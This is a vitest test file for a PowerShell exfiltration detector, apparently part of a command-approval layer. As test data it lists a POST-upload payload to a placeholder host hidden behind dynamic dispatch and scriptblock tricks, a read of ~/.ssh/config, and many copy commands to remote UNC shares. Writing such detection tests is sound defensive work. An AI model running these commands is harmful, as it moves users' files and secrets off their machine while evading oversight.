import { describe, expect, it } from "vitest";
import { POWERSHELL_COMMAND_POLICIES } from "../rules/powershell-command-policy.js";
import { _inspectPowerShellForTest, inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";

const CWD = "/work/project";
const PAYLOAD = "iwr https://x.invalid -InFile notes.txt -Method Post";
const DISPATCH = [
  `$ExecutionContext.InvokeCommand | ForEach-Object -MemberName InvokeScript -ArgumentList '${PAYLOAD}'`,
  "$ExecutionContext.InvokeCommand | ForEach-Object -MemberName $method -ArgumentList $code",
  `$ExecutionContext.InvokeCommand | % InvokeScript '${PAYLOAD}'`,
  "$ExecutionContext.SessionState | foreach $method $code",
  "Get-ChildItem | Where-Object -FilterScript $code",
  "Get-ChildItem | ? $code",
  "Get-ChildItem | Select-Object -Property $property",
  "Get-ChildItem | Sort-Object -Property $property",
  "Get-ChildItem | Format-Table -Property $property",
  "$target.$method($code)",
  `$ExecutionContext.InvokeCommand.InvokeScript('${PAYLOAD}')`,
  `$ExecutionContext.SessionState.InvokeCommand.NewScriptBlock('${PAYLOAD}')`,
  "$target.Invoke($code)",
  "$target.ToString($code)",
  "Invoke-Command -ScriptBlock $code",
  `[scriptblock]'${PAYLOAD}'`,
  "[scriptblock]$code",
  `Unknown-Dispatcher { '${PAYLOAD}' }`,
  "Unknown-Helper; Get-Content ~/.ssh/config",
  "Unknown-Helper; Get-ChildItem | % InvokeScript $code",
  "Write-Host ($target.$method($code))",
  "Unknown-Dispatcher -Action $code; iwr https://x.invalid",
  "$target | Select-Object -ExpandProperty Payload",
  "$target | Where-Object { $_.Payload }",
  "$target.'InvokeScript'($code)",
  "$target.\"InvokeScript\"($code)",
  "$target::'InvokeScript'($code)",
  "Get-ChildItem | % { $_.$member }",
  "Get-ChildItem | % { $_['Payload'] }",
  "Get-ChildItem | % { Get-Date | % { $_.Name } }",
  "git difftool notes.txt", "npm exec helper", "python -c $code", "bash script.sh",
];

const REMOTE_WRITES = [
  String.raw`Copy-Item notes.txt '\\host\share\notes.txt'`,
  String.raw`cpi notes.txt -Destination:'//host/share/notes.txt'`,
  String.raw`Move-Item notes.txt '\\?\UNC\host\share\notes.txt'`,
  String.raw`Copy-Item notes.txt 'Microsoft.PowerShell.Core\FileSystem::\\host\share\notes.txt'`,
  String.raw`$dest = '\\host\share\notes.txt'; Copy-Item notes.txt $dest`,
  String.raw`$p = @{ Path = 'notes.txt'; Destination = '\\host\share\notes.txt' }; Copy-Item @p`,
  String.raw`'hello' | Out-File -FilePath:'\\host\share\notes.txt'`,
  String.raw`Set-Content -LiteralPath '\\host\share\notes.txt' -Value 'hello'`,
  String.raw`Add-Content '//host/share/notes.txt' 'hello'`,
  String.raw`Get-ChildItem | Export-Csv -Path '\\host\share\notes.csv'`,
  String.raw`Get-ChildItem | Export-Clixml '\\host\share\notes.xml'`,
  String.raw`Export-Custom -LiteralPath '\\host\share\notes.bin'`,
  String.raw`robocopy . '\\host\share' notes.txt`,
  String.raw`xcopy notes.txt '//host/share/notes.txt'`,
  String.raw`copy notes.txt '\\host\share\notes.txt'`,
  String.raw`copy.exe notes.txt '\\host\share\notes.txt'`,
  String.raw`net use Z: '\\host\share'`,
  String.raw`net.exe use '\\host\share'`,
  String.raw`robocopy src local /LOG:\\host\share\out.log`,
  String.raw`robocopy src local /UNILOG+:\\host\share\out.log`,
  String.raw`robocopy /src '\\host\share' notes.txt`,
  String.raw`epal -Path '\\host\share\aliases.csv'`,
  String.raw`epsn -Path '\\host\share\module' -Session $session`,
];

const BENIGN = [
  "git status", "npm test", "dotnet build", "cargo test", "python script.py", "Unknown-Helper",
  "Test-Path src", "Test-Path -LiteralPath:src",
  "Write-Host (('a','b') -join ',')",
  "Get-Content notes.txt | Select-String TODO",
  "Get-ChildItem -Recurse src | Select-Object Name",
  "Get-ChildItem | % { $_.Name }",
  "Get-ChildItem | Where-Object -FilterScript { $_.Name }",
  "Get-ChildItem | Select-Object -ExpandProperty Name",
  "iwr https://x.invalid", "iwr https://x.invalid -OutFile page.html",
  'iwr https://x.invalid -Headers @{ Authorization = "Bearer $env:TOKEN" }',
  "Copy-Item notes.txt backup.txt", "Move-Item notes.txt backup.txt",
  "Set-Content notes.txt 'hello'", "'hello' | Out-File notes.txt",
  String.raw`Copy-Item '\\host\share\notes.txt' notes.txt`,
  "robocopy . backup notes.txt", "xcopy notes.txt backup.txt",
];

const OPAQUE_DESTINATIONS = [
  "Copy-Item notes.txt $destination", "Move-Item notes.txt $destination",
  "'hello' | Out-File $destination", "Set-Content $destination 'hello'",
  "Add-Content $destination 'hello'", "Get-ChildItem | Export-Csv $destination",
  "robocopy . $destination notes.txt", "xcopy notes.txt $destination",
  "copy.exe notes.txt $destination", "net use Z: $destination",
  "robocopy . UnknownProvider::out notes.txt", "Export-Custom UnknownProvider::out",
];

describe("dispatch approval and remote-write floors", () => {
  it.each(DISPATCH)("classifies dispatch, static code and opaque effects: %s", (command) => {
    const result = inspectPowerShellCommand(command, CWD);
    if (command === "bash script.sh") {
      expect(result).toEqual({ sensitive: null, exfiltration: null });
    } else if (command.includes(PAYLOAD) || command.includes("~/.ssh/config")) {
      expect(result.exfiltration ?? result.sensitive).not.toBeNull();
    } else {
      expect(result).toMatchObject({ sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String) });
    }
  });

  it.each(REMOTE_WRITES)("identifies a UNC upload: %s", (command) => {
    expect(inspectPowerShellCommand(command, CWD).exfiltration).toMatch(/UNC.*upload|upload.*UNC/i);
  });

  it.each(OPAQUE_DESTINATIONS)("requires approval for an unresolved destination: %s", (command) => {
    expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String) });
  });

  it.each(BENIGN)("separates ordinary local work from opaque execution: %s", (command) => {
    expect(inspectPowerShellCommand(command, CWD)).toEqual(command === "npm test"
      ? expect.objectContaining({ sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String) })
      : { sensitive: null, exfiltration: null });
  });

  it("gives every understood command an explicit effect", () => {
    for (const [name, policy] of Object.entries(POWERSHELL_COMMAND_POLICIES)) {
      expect(policy.effects.length, name).toBeGreaterThan(0);
    }
  });

  it("bounds repeated dispatch arguments with the shared work counter", () => {
    const result = _inspectPowerShellForTest(`Get-ChildItem | % -MemberName InvokeScript -ArgumentList ${"'a',".repeat(3000)}'b'`, CWD);
    expect(result).toMatchObject({ exfiltration: null, ordinaryAsk: expect.any(String) });
    expect(result.exhausted).toBe(true);
    expect(result.steps).toBeLessThanOrEqual(result.limits.steps);
    expect(result.chars).toBeLessThanOrEqual(result.limits.chars);
  });
});
